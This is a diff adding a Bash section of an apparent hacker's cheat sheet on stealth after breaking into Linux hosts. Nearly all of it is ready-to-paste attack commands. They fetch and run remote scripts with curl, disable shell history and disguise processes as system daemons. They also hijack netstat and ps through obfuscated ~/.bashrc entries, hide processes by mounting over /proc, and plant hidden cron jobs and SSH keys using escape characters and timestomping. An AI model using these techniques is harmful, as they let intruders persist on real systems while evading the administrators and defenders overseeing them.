@@ -1,0 +1,213 @@
+Bash / Shell
+
+1.i. Set up a Hack Shell (bash):
+
+Make BASH less noisy. Disables ~/.bash_history and many other things.
+
+ source <(curl -SsfL https://thc.org/hs)
+
+Alternative URL:
+
+ source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
+
+And if there is no curl/wget, use surl and (temporarily) installed curl with bin curl.
+
+source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
+# Afterwards type `bin curl` to (temporarily) install curl (in memory).
+
+HackShell does much more but most importantly this:
+
+unset HISTFILE
+[ -n "$BASH" ] && export HISTFILE="/dev/null"
+export BASH_HISTORY="/dev/null"
+export LANG=en_US.UTF-8
+locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
+export LESSHISTFILE=-
+export REDISCLI_HISTFILE=/dev/null
+export MYSQL_HISTFILE=/dev/null
+TMPDIR="/tmp"
+[ -d "/var/tmp" ] && TMPDIR="/var/tmp"
+[ -d "/dev/shm" ] && TMPDIR="/dev/shm"
+export TMPDIR
+export PATH=".:${PATH}"
+if [[ "$SHELL" == *"zsh" ]]; then
+    PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
+else
+    PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
+fi
+alias wget='wget --no-hsts'
+alias vi="vi -i NONE"
+alias vim="vim -i NONE"
+alias screen="screen -ln"
+
+TERM=xterm reset -I
+stty cols 400 # paste this on its own before pasting the next line:
+resize &>/dev/null || { stty -echo;printf "\e[18t"; read -t5 -rdt R;IFS=';' read -r -a a <<< "${R:-8;25;80}";[ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}";a[1]="${a[2]}";a[2]="${R}";};stty sane rows "${a[1]}" cols "${a[2]}";}
+# stty sane rows 60 cols 160
+
+We use anew a lot, and this is a quick workaround:
+
+xanew() { awk 'hit[$0]==0 {hit[$0]=1; print $0}'; }
+which anew &>/dev/null || alias anew=xanew
+
+Bonus tip: Any command starting with a " " (space) will not get logged to history either.
+
+$  id
+
+1.ii. Hide your command / Daemonzie your command
+
+This will hide the process name only. Use zapper to also hide the command line options.
+
+(exec -a syslogd nmap -Pn -F -n --open -oG - 10.0.2.1/24) # Note the brackets '(' and ')'
+
+Start a background 'nmap' hidden as '/usr/sbin/sshd':
+
+(exec -a '/usr/sbin/sshd' nmap -Pn -F -n --open -oG - 10.0.2.1/24 &>nmap.log &)
+
+Start within a GNU screen:
+
+screen -dmS MyName nmap -Pn -F -n --open -oG - 10.0.2.1/24
+### Attach back to the nmap process
+screen -x MyName
+
+Alternatively, copy the binary to a new name:
+
+cd /dev/shm
+cp "$(command -v nmap)" syslogd
+PATH=.:$PATH syslogd -Pn -F -n --open -oG - 10.0.2.1/24
+
+or use bind-mount to (temporarily) let /sbin/init point to /dev/shm/nmap instead:
+
+mount -n --bind "$(command -v nmap)" /sbin/init
+# starting /sbin/init will instead execute nmap
+(/sbin/init -Pn -f -n --open -oG - 10.0.2.1/24 &>nmap.log &)
+
+1.iii. Hide your command line options
+
+Use zapper:
+
+curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m) && \
+chmod 755 zapper
+
+# Start Nmap but zap all options and show it as 'klog' in the process list:
+./zapper -a klog nmap -Pn -F -n --open -oG - 10.0.0.1/24
+# Started as a daemon and sshd-style name:
+(./zapper -a 'sshd: root@pts/0' nmap -Pn -F -n --open -oG - 10.0.0.1/24 &>nmap.log &)
+# Replace the existing shell with tmux (with 'exec').
+# Then start and hide tmux and all further processes - as some kernel process:
+exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
+
+1.iv. Hide a Network Connection
+
+The trick is to hijack netstat and use grep to filter out our connection. This example filters any connection on port 31337 or ip 1.2.3.4. The same should be done for ss (a netstat alternative).
+
+Method 1 - Hiding a connection with bash-function in ~/.bashrc
+
+Cut & paste this to add the line to ~/.bashrc
+
+echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
+
+Or cut & paste this for an obfuscated entry to ~/.bashrc:
+
+X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
+echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
+
+The obfuscated entry to ~/.bashrc will look like this:
+
+eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
+
+Method 2 - Hiding a connection with a binary in $PATH
+
+Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (echo $PATH) lists /usr/local/sbin before /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.
+
+echo '#! /bin/bash
+exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat \
+&& chmod 755 /usr/local/sbin/netstat \
+&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
+
+(thank you iamaskid)
+
+1.v. Hide a process as user
+
+Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our grep does not show up in the process list by renaming it to GREP:
+
+echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
+&& touch -r /etc/passwd ~/.bashrc
+
+1.vi. Hide a process as root
+
+This requires root privileges and is an old Linux trick by over-mounting /proc/<pid> with a useless directory:
+
+hide() {
+    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
+    _pid=${1:-$$}
+    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
+    local _argstr
+    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
+    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
+}
+
+To hide a command use:
+
+hide                                 # Hides the current shell/PID
+hide 31337                           # Hides process with pid 31337
+hide sleep 1234                      # Hides 'sleep 1234'
+hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a background process
+
+(thanks to druichi for improving this)
+
+1.vii. Hide shell scripts
+
+Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use source instead. The source command can be shortened to . (yes, a dot) and it also searches through the $PATH variable to find the file to load.
+
+In this example our script prng contains all of our shell functions from above. Those functions hide the nmap process and the network connection. Last we add . prng into the systemwide rc file. This will load prng when the user (and root) logs in:
+
+echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
+ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
+&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
+&& touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
+
+(The same works for lsof, ss and ls)
+
+1.viii. Hide from cat
+
+ANSI escape characters or a simple \r (carriage return) can be used to hide from cat and others.
+
+Hide the last command (example: id) in ~/.bashrc:
+
+echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
+### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
+### moves the cursor 1 line up.
+### The '#' after the command 'id' is a comment and is needed so that bash still
+### executes the 'id' but ignores the two ANSI escape sequences.
+
+Add a hidden crontab line:
+
+(crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab
+
+Adding a \r (carriage return) goes a long way to hide your ssh key from cat:
+
+echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
+### This adds our key as the first key and 'cat authorized_keys' won't show
+### it. The $'\r' is a bash special to create a \r (carriage return).
+
+1.ix. Execute in parallel with separate logfiles*
+
+Note: The same can be achieved with parallel.
+
+Scan hosts with 20 parallel tasks:
+
+cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c 'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'
+
+    exec is used to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running/useless shell binaries.
+    ${SLOT} contains a value between 0..19. It's the "task number". We use it to write the nmap-results into 20 separate files.
+
+Execute Linpeas on all gsocket hosts using 40 workers:
+
+cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
+
+    Log each result into a separate file but log all errors into a error-log file by task-number.
+
